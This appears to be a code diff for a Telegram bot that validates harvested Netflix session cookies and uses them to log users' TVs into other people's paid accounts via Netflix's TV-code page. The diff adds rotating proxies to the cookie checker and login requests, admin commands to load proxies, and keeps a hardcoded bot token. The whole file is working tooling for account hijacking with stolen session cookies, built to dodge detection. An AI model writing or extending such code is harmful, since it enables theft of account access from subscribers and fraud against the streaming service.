@@ -68,7 +68,7 @@ except ImportError:
     RAR_SUPPORT = False
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = "8643705076:AAE4OT07CYLCFQzJfvuET7vlBhaHGGwWeV4"  # Hardcoded token
+BOT_TOKEN = "8643705076:AAE4OT07CYLCFQzJfvuET7vlBhaHGGwWeV4"  # Update with your active token from @BotFather
 ADMIN_IDS = [6420446828]  # Your Telegram user IDs
 
 REQUIRED_CHANNELS = [{
@@ -76,8 +76,7 @@ REQUIRED_CHANNELS = [{
     "invite_link": "https://t.me/XeronLab",
 }]
 
-# Increased timeout to prevent Render network timeout errors
-REQUEST_TIMEOUT = 25
+REQUEST_TIMEOUT = 10
 MAX_USAGE_PER_COOKIE = 2
 MAX_COOKIES_TO_TRY = 3
 
@@ -107,11 +106,13 @@ cookies_col = db["cookies"] if db is not None else None
 stats_col = db["user_stats"] if db is not None else None
 channels_col = db["channels"] if db is not None else None
 users_col = db["known_users"] if db is not None else None
+proxies_col = db["proxies"] if db is not None else None
 
 _local_cookies_store = {}
 _local_user_stats = {}
 _local_channels = []
 _local_users = set()
+_local_proxies = []
 
 BASE_HEADERS = {
     "User-Agent": (
@@ -137,6 +138,59 @@ BASE_HEADERS = {
 }
 
 
+# ========== PROXY MANAGEMENT FUNCTIONS ==========
+def parse_proxy_string(proxy_str: str) -> Optional[Dict[str, str]]:
+    """Parses 'user:pass:host:port' or 'host:port:user:pass' or 'host:port'."""
+    parts = proxy_str.strip().split(":")
+    if len(parts) == 4:
+        if "." in parts[0]:
+            host, port, user, password = parts[0], parts[1], parts[2], parts[3]
+        else:
+            user, password, host, port = parts[0], parts[1], parts[2], parts[3]
+        formatted_url = f"http://{user}:{password}@{host}:{port}"
+        return {"http": formatted_url, "https": formatted_url}
+    elif len(parts) == 2:
+        host, port = parts[0], parts[1]
+        formatted_url = f"http://{host}:{port}"
+        return {"http": formatted_url, "https": formatted_url}
+    return None
+
+
+def test_proxy_connection(proxy_dict: Dict[str, str]) -> bool:
+    try:
+        r = requests.get(
+            "https://api.ipify.org?format=json",
+            proxies=proxy_dict,
+            timeout=5,
+            verify=False,
+        )
+        return r.status_code == 200
+    except Exception:
+        return False
+
+
+def save_proxy_to_db(proxy_raw: str, proxy_dict: Dict[str, str]):
+    if proxies_col is not None:
+        proxies_col.update_one(
+            {"_id": proxy_raw},
+            {"$set": {"raw": proxy_raw, "formatted": proxy_dict}},
+            upsert=True,
+        )
+    else:
+        if proxy_dict not in _local_proxies:
+            _local_proxies.append(proxy_dict)
+
+
+def get_random_proxy() -> Optional[Dict[str, str]]:
+    if proxies_col is not None:
+        docs = list(proxies_col.find({}))
+        if docs:
+            return random.choice(docs)["formatted"]
+    elif _local_proxies:
+        return random.choice(_local_proxies)
+    return None
+
+
 # ========== HELPER & USER TRACKING FUNCTIONS ==========
 async def safe_reply(message, text, **kwargs):
     try:
@@ -148,7 +202,6 @@ async def safe_reply(message, text, **kwargs):
 
 
 def register_user(user_id: int):
-    """Stores active user IDs for broadcasting global maintenance alerts."""
     if users_col is not None:
         users_col.update_one({"_id": user_id}, {"$set": {"user_id": user_id}}, upsert=True)
     else:
@@ -331,7 +384,7 @@ async def check_force_join(
     return True
 
 
-# ========== COOKIE EXTRACTION & ACCURATE VALIDATION ==========
+# ========== COOKIE EXTRACTION & VALIDATION ==========
 def extract_netflix_id_from_text(text: str) -> Optional[str]:
     match = re.search(r"netflixid\s*=\s*([^\s;]+)", text, re.IGNORECASE)
     if match:
@@ -367,17 +420,17 @@ def extract_netflix_id_from_text(text: str) -> Optional[str]:
 
 
 def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
-    """Validates if cookie is active, paid, and not on hold without following redirects."""
     session = requests.Session()
     session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
     headers = BASE_HEADERS.copy()
     headers["Referer"] = "https://www.netflix.com/"
+    proxy = get_random_proxy()
 
     try:
-        # Step 1: Catch redirects to /login immediately
         r = session.get(
             "https://www.netflix.com/YourAccount",
             headers=headers,
+            proxies=proxy,
             timeout=REQUEST_TIMEOUT,
             verify=False,
             allow_redirects=False,
@@ -388,10 +441,10 @@ def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
             if "login" in redirect_target or "signup" in redirect_target:
                 return False, "Dead/Expired Cookie"
 
-        # Step 2: Fetch membership details
         r2 = session.get(
             "https://www.netflix.com/account/membership",
             headers=headers,
+            proxies=proxy,
             timeout=REQUEST_TIMEOUT,
             verify=False,
             allow_redirects=True,
@@ -406,7 +459,6 @@ def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
         if "/login" in r2.url.lower() or ("sign in" in lower_html and "password" in lower_html):
             return False, "Dead/Expired Cookie"
 
-        # Step 3: Payment Hold check
         hold_indicators = [
             "payment on hold",
             "update your payment information",
@@ -417,7 +469,6 @@ def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
         if any(indicator in lower_html for indicator in hold_indicators):
             return False, "Payment On Hold"
 
-        # Step 4: Free Plan check
         inactive_indicators = [
             "free plan",
             "no active plan",
@@ -461,11 +512,13 @@ def submit_tv_code(
     headers = BASE_HEADERS.copy()
     headers["Referer"] = "https://www.netflix.com/tv2"
     headers["Origin"] = "https://www.netflix.com"
+    proxy = get_random_proxy()
 
     try:
         r = session.get(
             "https://www.netflix.com/tv2",
             headers=headers,
+            proxies=proxy,
             timeout=REQUEST_TIMEOUT,
             verify=False,
         )
@@ -502,6 +555,7 @@ def submit_tv_code(
             "https://www.netflix.com/tv2",
             data=payload,
             headers=post_headers,
+            proxies=proxy,
             timeout=REQUEST_TIMEOUT,
             verify=False,
             allow_redirects=True,
@@ -540,8 +594,9 @@ def fetch_page(netflix_id: str, url: str) -> Tuple[Optional[str], Optional[str]]
         "Accept-Language": BASE_HEADERS["Accept-Language"],
         "Referer": "https://www.netflix.com/",
     }
+    proxy = get_random_proxy()
     try:
-        r = sess.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+        r = sess.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
         if r.status_code != 200:
             return None, f"HTTP {r.status_code}"
         content = r.content
@@ -590,7 +645,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await safe_reply(
         update.message,
         "𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 ℕ𝔼𝕋𝔽𝕃𝕀𝕏 𝕋𝕍 𝕃𝕆𝔾𝕀ℕ 𝔹𝕆𝕋!\n\n"
-        "⚡𝗜𝗡𝗦𝗧𝗔𝗡𝗧𝗟𝗬 𝗟𝗢𝗚𝕀ℕ⚡\n⚡𝗠𝗜𝗫 𝗣𝗟𝗔𝗡 𝗟𝗢𝗚𝕀ℕ⚡\n\n"
+        "⚡𝗜𝗡𝗦𝗧𝗔𝗡𝗧𝗟𝗬 𝗟𝗢𝗚𝗜𝗡⚡\n⚡𝗠𝗜𝗫 𝗣𝗟𝗔𝗡 𝗟𝗢𝗚𝕀ℕ⚡\n\n"
         "𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
     )
 
@@ -647,13 +702,67 @@ async def channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin command to immediately stop any active bulk check."""
     global stop_requested
     if update.effective_user.id not in ADMIN_IDS:
         await safe_reply(update.message, "⛔ Admins only.")
         return
     stop_requested = True
     await safe_reply(update.message, "🛑 **Stop signal sent!** Stopping current bulk operations...")
+
+
+async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await safe_reply(update.message, "⛔ Admins only.")
+        return
+
+    args = context.args
+    if not args:
+        await safe_reply(
+            update.message,
+            "⚠️ **Usage:**\n`/addproxy user:pass:host:port`\nor\n`/addproxy host:port:user:pass`\n\nMultiple proxies can be separated by spaces.",
+            parse_mode="Markdown",
+        )
+        return
+
+    status_msg = await safe_reply(update.message, f"🔍 Testing `{len(args)}` proxy string(s)...")
+    added, failed = 0, 0
+
+    for proxy_str in args:
+        proxy_dict = parse_proxy_string(proxy_str)
+        if not proxy_dict:
+            failed += 1
+            continue
+
+        is_working = await asyncio.to_thread(test_proxy_connection, proxy_dict)
+        if is_working:
+            save_proxy_to_db(proxy_str, proxy_dict)
+            added += 1
+        else:
+            failed += 1
+
+    await status_msg.edit_text(
+        "✅ **Proxy Import Complete!**\n\n"
+        f"🟢 **Working Added:** `{added}`\n"
+        f"🔴 **Failed/Invalid:** `{failed}`",
+        parse_mode="Markdown",
+    )
+
+
+async def listproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await safe_reply(update.message, "⛔ Admins only.")
+        return
+
+    if proxies_col is not None:
+        count = proxies_col.count_documents({})
+    else:
+        count = len(_local_proxies)
+
+    await safe_reply(
+        update.message,
+        f"🌐 **Proxy Pool Stats:**\n\nActive proxies in database: `{count}`",
+        parse_mode="Markdown",
+    )
 
 
 async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -678,7 +787,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not tv_code.isdigit() or len(tv_code) < 5:
         await safe_reply(
             update.message,
-            "𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗛𝗘 𝗖𝗢𝗗𝗘 𝗜𝗦 𝗜𝗡𝗩𝗔𝗟𝗜𝗗❌\n\n"
+            "𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗛𝗘 𝗖𝗢𝗗𝗘 𝗜𝗦 𝗜𝗡𝗩𝗔🇱𝗜𝗗❌\n\n"
             "𝗦𝗨𝗣𝗣𝗢𝗥𝗧𝗘𝗗 𝗙𝗢𝗥𝗠𝗔𝗧\n/𝗟𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰-𝟱𝟲𝟳𝟴\n/𝗹𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴\n\n"
             " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
         )
@@ -688,7 +797,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not all_cookies:
         await safe_reply(
             update.message,
-            "𝗡𝗢 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗨𝗥𝗥𝗘𝗡𝗧🇱𝗬!\n\n"
+            "𝗡𝗢 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 𝗔𝗩𝗔𝗜🇱𝗔🇧🇱𝗘 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝕃𝕐!\n\n"
             "𝗣𝗹𝗲𝗮𝘀𝗲 𝗧𝗥𝗬 𝗟𝗮𝘁𝗲𝗿!\n\n"
             " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
         )
@@ -701,10 +810,6 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     random.shuffle(valid_cookies)
     cookies_to_try = valid_cookies[:MAX_COOKIES_TO_TRY]
-
-    logger.info(
-        f"Trying {len(cookies_to_try)} randomized cookies (out of {len(all_cookies)} total)"
-    )
 
     success = False
     for cookie_entry in cookies_to_try:
@@ -725,7 +830,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             success_text = (
                 "⚡𝐘𝐎𝐔𝐑 𝐓𝐕 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐋𝐎𝐆𝐆𝐄𝐃 𝐈𝐍 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!⚡\n\n"
-                f"ℂ𝕆𝕌ℕ𝕋ℝℝ𝕐:❮{country.upper()}❯     ┃  "
+                f"ℂ𝕆𝕌ℕ𝕋ℝ𝕐:❮{country.upper()}❯     ┃  "
                 f" ℙ𝕃𝔸ℕ:❮{plan.upper()}❯\n\n"
                 "𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃"
             )
@@ -747,7 +852,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not success:
         fail_text = (
-            "𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗛𝗘 𝗖𝗢𝗗𝗘 𝗜𝗦 𝗜𝗡𝗩𝗔𝗟𝗜𝗗❌\n\n"
+            "𝗟𝗢𝗚𝗜𝗡 𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗛𝗘 𝗖𝗢𝗗𝗘 𝗜𝗦 𝗜𝗡𝗩𝗔🇱𝗜𝗗❌\n\n"
             "𝗦𝗨𝗣𝗣𝗢𝗥𝗧𝗘𝗗 𝗙𝗢𝗥𝗠𝗔𝗧\n/𝗟𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰-𝟱𝟲𝟳𝟴\n/𝗹𝗼𝗴𝗶𝗻 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴\n\n"
             " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃"
         )
@@ -760,7 +865,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await safe_reply(update.message, fail_text)
 
 
-# ========== ADMIN /RECHECK & BROADCAST COMMAND ==========
+# ========== ADMIN /RECHECK COMMAND ==========
 async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global stop_requested
     if update.effective_user.id not in ADMIN_IDS:
@@ -808,11 +913,11 @@ async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         is_alive, reason = check_if_cookie_alive(netflix_id)
         return cookie_entry, is_alive, reason
 
-    # Lowered concurrency (max_workers=3) to fix Render timeouts
     with ThreadPoolExecutor(max_workers=3) as executor:
         futures = [executor.submit(check_task, c) for c in all_cookies]
         for future in futures:
             if stop_requested:
+                executor.shutdown(wait=False, cancel_futures=True)
                 break
             entry, is_alive, reason = future.result()
             checked += 1
@@ -848,27 +953,6 @@ async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ========== OTHER ADMIN COMMANDS ==========
-async def addsingle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS:
-        await safe_reply(update.message, "⛔ Admins only.")
-        return
-    context.user_data["awaiting_single_file"] = True
-    await safe_reply(
-        update.message, "📤 Please send the cookie file (.txt or .json)"
-    )
-
-
-async def bulkadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS:
-        await safe_reply(update.message, "⛔ Admins only.")
-        return
-    await safe_reply(
-        update.message,
-        "/BulkAdd 𝔸𝔻𝔻 𝕄𝕌𝕃𝕋𝕀ℙ𝕃𝔼 ℂ𝕆𝕆𝕂𝕀𝔼𝕊 𝔽𝕀𝕃𝔼 𝕊𝕌ℙℙ𝕆ℝ𝕋𝔼𝔻 𝔽𝕆ℝ𝕄𝔸𝕋 .𝕫𝕚𝕡 𝕒𝕟𝕕 .𝕣𝕒𝕣",
-    )
-    context.user_data["awaiting_bulk_file"] = True
-
-
 async def delall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
         await safe_reply(update.message, "⛔ Admins only.")
@@ -924,14 +1008,20 @@ async def del_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await safe_reply(update.message, "❌ Cookie not found or you don't own it.")
 
 
-# ========== FILE HANDLER WITH AUTO-DETECTION & CANCELLATION ==========
+# ========== FILE HANDLER WITH AUTO-DETECTION & INSTANT STOP ==========
 def process_single_cookie_task(fname: str, content: str, admin_id: int):
     if stop_requested:
         return False, "Stopped"
     netflix_id = extract_netflix_id_from_text(content)
     if not netflix_id:
         return False, "No NetflixId"
+    if stop_requested:
+        return False, "Stopped"
+
     is_alive, reason = check_if_cookie_alive(netflix_id)
+    if stop_requested:
+        return False, "Stopped"
+
     if is_alive:
         success, msg = add_cookie_with_metadata(admin_id, fname, netflix_id)
         if success:
@@ -952,18 +1042,13 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_name = document.file_name.lower()
 
     if document.file_size > 15 * 1024 * 1024:
-        await safe_reply(
-            update.message, "❌ File too large (max 15 MB)."
-        )
+        await safe_reply(update.message, "❌ File too large (max 15 MB).")
         return
 
-    status_msg = await safe_reply(
-        update.message, "📥 Downloading and checking file..."
-    )
-
+    status_msg = await safe_reply(update.message, "📥 Downloading and checking file...")
     stop_requested = False
 
-    # Auto-detection for single .txt or .json files
+    # Auto-detection for single .txt / .json files
     if file_name.endswith((".txt", ".json")):
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
@@ -974,18 +1059,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.edit_text("❌ No valid NetflixId found in the file.")
             return
 
-        is_alive, reason = await asyncio.to_thread(
-            check_if_cookie_alive, netflix_id
-        )
+        is_alive, reason = await asyncio.to_thread(check_if_cookie_alive, netflix_id)
         if not is_alive:
             await status_msg.edit_text(
                 f"❌ **Cookie Rejected:** `{reason}`", parse_mode="Markdown"
             )
             return
 
-        success, msg = add_cookie_with_metadata(
-            user.id, document.file_name, netflix_id
-        )
+        success, msg = add_cookie_with_metadata(user.id, document.file_name, netflix_id)
         if success:
             await status_msg.edit_text(
                 f"✅ **Alive Cookie Added:** `{document.file_name}`",
@@ -995,7 +1076,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.edit_text("⚠️ Cookie already exists in storage.")
         return
 
-    # Auto-detection for .zip or .rar files
+    # Auto-detection for .zip / .rar files
     if file_name.endswith(".zip") or (RAR_SUPPORT and file_name.endswith(".rar")):
         await status_msg.edit_text("📦 Extracting archive...")
         file = await context.bot.get_file(document.file_id)
@@ -1024,7 +1105,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         processed = 0
         last_edit_time = time.time()
 
-        # Lowered workers (3 threads) to avoid CPU bottleneck timeouts
         with ThreadPoolExecutor(max_workers=3) as executor:
             futures = [
                 executor.submit(process_single_cookie_task, fname, content, user.id)
@@ -1032,13 +1112,17 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]
             for future in futures:
                 if stop_requested:
+                    executor.shutdown(wait=False, cancel_futures=True)
                     break
+
                 ok, res = future.result()
                 processed += 1
                 if ok:
                     added += 1
                 elif res == "Duplicate":
                     dupes += 1
+                elif res == "Stopped":
+                    break
                 else:
                     dead += 1
 
@@ -1078,8 +1162,8 @@ async def set_commands(app: Application):
     ]
     await app.bot.set_my_commands(default_commands)
     admin_commands = default_commands + [
-        BotCommand("addsingle", "Add a single cookie"),
-        BotCommand("bulkadd", "Add ZIP/RAR of cookies"),
+        BotCommand("addproxy", "Add proxy (user:pass:host:port)"),
+        BotCommand("listproxies", "Show active proxies count"),
         BotCommand("recheck", "Recheck DB & broadcast notice"),
         BotCommand("stop", "Stop active bulk checking"),
         BotCommand("listcookies", "Show all cookies"),
@@ -1097,16 +1181,16 @@ async def set_commands(app: Application):
 
 # ========== MAIN ==========
 def main():
-    if not BOT_TOKEN:
-        print("❌ Please set your BOT_TOKEN in the script.")
+    if not BOT_TOKEN or BOT_TOKEN == "YOUR_NEW_BOT_TOKEN_HERE":
+        print("❌ Please update BOT_TOKEN with a valid key in tv.py.")
         return
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("login", login_command))
     app.add_handler(CommandHandler("panel", panel_command))
     app.add_handler(CommandHandler("channels", channels_command))
-    app.add_handler(CommandHandler("addsingle", addsingle_command))
-    app.add_handler(CommandHandler("bulkadd", bulkadd_command))
+    app.add_handler(CommandHandler("addproxy", addproxy_command))
+    app.add_handler(CommandHandler("listproxies", listproxies_command))
     app.add_handler(CommandHandler("recheck", recheck_command))
     app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("delall", delall_command))
@@ -1123,4 +1207,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-       
